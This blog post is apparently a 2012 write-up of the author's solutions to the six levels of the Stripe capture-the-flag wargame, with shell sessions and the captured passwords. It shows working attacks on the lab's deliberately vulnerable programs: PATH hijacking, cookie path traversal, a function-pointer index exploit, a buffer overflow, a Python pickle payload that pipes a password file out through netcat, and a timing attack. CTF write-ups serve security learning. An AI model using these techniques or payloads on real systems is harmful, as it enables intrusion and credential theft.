---
layout: post
title: "Stripe CTF"
date: 2012-02-28
comments: false
---

<div class='post'>
<p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Code is available at <a href="https://github.com/pcorliss/Stripe-CTF">https://github.com/pcorliss/Stripe-CTF</a></p><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; "><span style="font-size: 100%; ">My solutions to the </span><a href="https://stripe.com/blog/capture-the-flag" style="font-size: 100%; ">Stripe CTF</a><span style="font-size: 100%; "> challenge </span><span style="font-size: 100%; ">are as follows.</span></p><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Note that in many cases the code isn't very robust or workable. But was<br />the minimum needed to complete the level.</p><h2 style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Level 01</h2><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">On observing that the system call within level01.c made an unchecked<br />call to 'date' without a full path specified I created a local date<br />file and set it to the local path. That file was simple shell script<br />containing 'cat /home/level02/.password'.</p><pre style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; "><code>level01@ctf:/tmp/tmp.8N0qqvoaVu$ export PATH=/tmp/tmp.8N0qqvoaVu:$PATH<br />level01@ctf:/tmp/tmp.8N0qqvoaVu$ chmod a+x date<br />level01@ctf:/tmp/tmp.8N0qqvoaVu$ /levels/level01<br />Current time: kxlVXUvzv</code></pre><h2 style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Level 02</h2><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Level 2 uses the contents of the clients cookie to read a file without<br />escaping the contents. Via a browser I modified the cookie set by the<br />level to the following and the password was printed as part of the web<br />page.</p><pre style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; "><code>Change cookie to ../../home/level03/.password<br />Or0m4UX07b</code></pre><h2 style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Level 03</h2><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">I had never performed any sort of pointer arithmatic outside of an<br />introductory CS course. So this was certainly a challenge for me.<br />Outside of level 6 I think I spent more time on this level than any of<br />the other ones.</p><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">On reading level 3's source code I noticed that it was executing the<br />function via an array of function pointers. However the selection<br />mechanism used an argument which only checked for positive numbers &gt;= 3<br />and not for number &lt; 0.</p><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">After spending more time with it and gdb I realized you could select a negative<br />number which pointed to a specific location in the string buffer you<br />pass as an argument as well. After some fiddling I provided the memory<br />address of the deprected run function.</p><pre style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; "><code>level03@ctf4:/tmp/tmp.uuCAtV5Uog$ /levels/level03 -21 'cat /home/level04/.password;'$'\x5b'$'\x87'$'\x04'$'\x08'<br />i5cBbPvPCpcP<br />sh: [: not found</code></pre><h2 style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Level 04</h2><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Like Level 03 I had never performed a buffer overflow before. I did some<br />searching and came across the following which amounts to a <a href="http://biblio.l0t3k.net/b0f/en/BOFwithperl.txt">buffer<br />overflows for dummies</a>. With some tweaking I was<br />able to make it work for the level 4 binary. It works about 50% of the<br />time. From what I understand Linux uses some sort of stack randomization<br />to prevent this sort of attack. From reading other reports online there<br />is a way to get a dterministic solution but I didn't take the time to<br />expore that.</p><pre style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; "><code>Offset:-994Address: 0xffa368fe<br />Executing<br />Buffer:57200<br />Buffer:0<br />$<br />$ whoami<br />level05<br />$ cat /home/level05/.password<br />fzfDGnSmd317</code></pre><h2 style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Level 05</h2><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">After looking at the python web server and running it locally. I noticed<br />that it wasn't properly escaping user input and allowed a file<br />containing executable code to be written to. I pickled up a simple<br />exploit, started a netcat server listening and passed it through.</p><pre style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; "><code>level05@ctf4:/tmp/tmp.7mKxYf6M1c$ nc -l 9333 &amp;<br />[1] 24599<br />level05@ctf4:/tmp/tmp.7mKxYf6M1c$<br />level05@ctf4:/tmp/tmp.7mKxYf6M1c$ curl localhost:9020 -d "DATA; job: cos<br />system<br />(S'nc localhost 9333 &lt; /home/level06/.password'<br />tR.'<br />tR.<br />"<br />SF2w8qU1QDj<br />{<br />"result": "Job timed out"<br />}<br />[1]+  Done                    nc -l 9333</code></pre><h2 style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Level 06</h2><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Of all the challenges this one<br />took the most time. I had heard of and felt I understood the<br />implementation of a timing attack but had no idea how hard it would be<br />to actually implement.</p><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">First I tried something written in ruby to test the time taken to run<br />the command, however I saw very little difference in how fast something<br />failed. Given that I was initially testing for the difference between 1<br />variable check and two and the precision of the ruby clock was only in<br />nanoseconds this failed right away.</p><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">Then I tried an <a href="https://github.com/dividuum/stripe-ctf">implementation</a> that already existed online simply to<br />see if they could work given that many of the servers were under heavy<br />load and actively running out of forks. But even the supposed solution<br />above failed to work for me as it seems to depend on the binary forking<br />and reporting failure almost immediately which I wasn't even able to<br />replicate locally.</p><p><span><span style="font-size: 100%;">Finally I settled on passing very large arguments to slow down the</span></span><br /><span><span style="font-size: 100%;">evaluation, similar to the solution above. Then timed each char read in</span></span><br /><span><span style="font-size: 100%;">microseconds via a small c program. The fork operation takes slightly</span></span><br /><span><span style="font-size: 100%;">longer to run than a normal character check and therefore with</span></span><br /><span><span style="font-size: 100%;">microsecond precision you can determine where the failure </span>occurred<span style="font-size: 100%;">.</span></span></p><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">This solution worked perfectly for me locally but I had to tune it on<br />stripe's servers in order to get it to work. I'm not sure if I was<br />reading the buffer incorrectly, the machine was overloaded or if my code<br />just runs in a way that I'm not expecting. Either way with some fine<br />tuning and extra sanity checks I was able to get it to run against the password file<br />and produce the answer.</p><pre style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; "><code>level06@ctf5:/tmp/tmp.2eCZvV2CuJ$ ruby ruby_wrapper.rb<br />Suffix: 130772<br />{"t"=&gt;4}<br />Answer: t<br />{"h"=&gt;5}<br />Answer: th<br />{"e"=&gt;5}<br />Answer: the<br />{"f"=&gt;4}<br />Answer: thef<br />{"l"=&gt;5}<br />Answer: thefl<br />{"a"=&gt;5}<br />Answer: thefla<br />{"g"=&gt;5}<br />Answer: theflag<br />{"l"=&gt;5}<br />Answer: theflagl<br />{"0"=&gt;4}<br />Answer: theflagl0<br />{"e"=&gt;4}<br />Answer: theflagl0e<br />{"F"=&gt;4}<br />Answer: theflagl0eF<br />{"T"=&gt;5}<br />Answer: theflagl0eFT<br />{"t"=&gt;5}<br />Answer: theflagl0eFTt<br />{"I"=&gt;1, "T"=&gt;5}<br />Answer: theflagl0eFTtT<br />{"5"=&gt;5}<br />Answer: theflagl0eFTtT5<br />{"o"=&gt;5}<br />Answer: theflagl0eFTtT5o<br />{"i"=&gt;5}<br />Answer: theflagl0eFTtT5oi<br />{"0"=&gt;4}<br />Answer: theflagl0eFTtT5oi0<br />{"n"=&gt;5, "r"=&gt;1}<br />Answer: theflagl0eFTtT5oi0n<br />{"O"=&gt;5}<br />Answer: theflagl0eFTtT5oi0nO<br />{"T"=&gt;5}<br />Answer: theflagl0eFTtT5oi0nOT<br />{"x"=&gt;5, "e"=&gt;1}<br />Answer: theflagl0eFTtT5oi0nOTx<br />{"O"=&gt;5}<br />Answer: theflagl0eFTtT5oi0nOTxO<br />{"5"=&gt;5}<br />Answer: theflagl0eFTtT5oi0nOTxO5<br />{}<br />Answer: theflagl0eFTtT5oi0nOTxO5<br /><br />level06@ctf5:/tmp/tmp.2eCZvV2CuJ$ /levels/level06 /home/the-flag/.password theflagl0eFTtT5oi0nOTxO5<br />Welcome to the password checker!<br />........................<br />Wait, how did you know that the password was theflagl0eFTtT5oi0nOTxO5?</code></pre><h2 style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">The Flag</h2><p style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; ">You're able to login as the flag user but I couldn't find anything<br />special or a secret next level. Perhaps I didn't look hard enough?</p><pre style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal; "><code>the-flag@ctf5:/tmp/tmp.qCU4Sz2RhR$<br /></code></pre></div>
